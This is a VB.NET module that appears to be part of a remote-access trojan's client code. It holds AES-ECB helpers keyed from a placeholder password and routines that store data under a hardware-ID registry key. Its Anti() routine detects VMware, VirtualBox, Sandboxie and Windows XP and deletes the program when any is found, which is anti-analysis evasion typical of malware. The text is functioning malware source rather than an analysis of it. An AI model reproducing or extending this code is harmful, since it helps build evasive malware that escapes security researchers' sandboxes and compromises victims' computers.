
Imports System.Reflection
Imports System.Security.Cryptography
Imports Microsoft.Win32

Module C_Func
    Public pass As String = "|'x'|"

    Public Function AES_Encrypt(ByVal input As String)
        Dim AES As New RijndaelManaged
        Dim Hash_AES As New MD5CryptoServiceProvider
        Dim encrypted As String = ""
        Try
            Dim hash(31) As Byte
            Dim temp As Byte() = Hash_AES.ComputeHash(SB(pass))
            Array.Copy(temp, 0, hash, 0, 16)
            Array.Copy(temp, 0, hash, 15, 16)
            AES.Key = hash
            AES.Mode = CipherMode.ECB
            Dim DESEncrypter As ICryptoTransform = AES.CreateEncryptor
            Dim Buffer As Byte() = SB(input)
            encrypted = Convert.ToBase64String(DESEncrypter.TransformFinalBlock(Buffer, 0, Buffer.Length))
            Return encrypted
        Catch ex As Exception
        End Try
    End Function
    Public Function AES_Decrypt(ByVal input As String)
        Dim AES As New RijndaelManaged
        Dim Hash_AES As New MD5CryptoServiceProvider
        Dim decrypted As String = ""
        Try
            Dim hash(31) As Byte
            Dim temp As Byte() = Hash_AES.ComputeHash(SB(pass))
            Array.Copy(temp, 0, hash, 0, 16)
            Array.Copy(temp, 0, hash, 15, 16)
            AES.Key = hash
            AES.Mode = CipherMode.ECB
            Dim DESDecrypter As ICryptoTransform = AES.CreateDecryptor
            Dim Buffer As Byte() = Convert.FromBase64String(input)
            decrypted = BS(DESDecrypter.TransformFinalBlock(Buffer, 0, Buffer.Length))
            Return decrypted
        Catch ex As Exception
        End Try
    End Function

    Function SB(ByVal s As String) As Byte() ' string to byte()
        Return System.Text.Encoding.Default.GetBytes(s)
    End Function

    Function BS(ByVal b As Byte()) As String ' byte() to string
        Return System.Text.Encoding.Default.GetString(b)
    End Function

    Function DLV(ByVal n As String) ' delete value in my Registry Key RG
        Try
            Registry.CurrentUser.CreateSubKey("Software\" & ID.HWID).DeleteValue(n)
        Catch ex As Exception
        End Try
    End Function

    Function GTV(ByVal n As String) As String ' Get value in my Registry Key RG
        Try
            Return Registry.CurrentUser.CreateSubKey("Software\" & ID.HWID).GetValue(n, "")
        Catch ex As Exception
            Return ""
        End Try
    End Function

    Function STV(ByVal n As String, ByVal t As String) ' set value in my Registry Key RG
        Try
            Registry.CurrentUser.CreateSubKey("Software\" & ID.HWID).SetValue(n, t)
            Return True
        Catch ex As Exception
            Return False
        End Try
    End Function

    Function SplitWord(ByVal b As Byte(), ByVal Word As String) As Array ' split bytes by word
        Dim a As New Collections.Generic.List(Of Byte())
        Dim M As New IO.MemoryStream
        Dim MM As New IO.MemoryStream
        Dim T As String() = Split(BS(b), Word)
        M.Write(b, 0, T(0).Length)
        MM.Write(b, T(0).Length + Word.Length, b.Length - (T(0).Length + Word.Length))
        a.Add(M.ToArray)
        a.Add(MM.ToArray)
        M.Dispose()
        MM.Dispose()
        Return a.ToArray
    End Function

    Sub Anti()
        On Error Resume Next
        If IO.File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.System) & "\vmGuestLib.dll") Then
            Installation.DEL()

        ElseIf ID.MyOS.ToString.ToLower.Contains("XP".ToLower) Then
            Installation.DEL()

        ElseIf Process.GetProcessesByName("SbieSvc").Length >= 1 Then
            Installation.DEL()

        ElseIf IO.File.Exists(Environment.GetEnvironmentVariable("windir") & "\vboxmrxnp.dll") Then
            Installation.DEL()
        End If
    End Sub

End Module
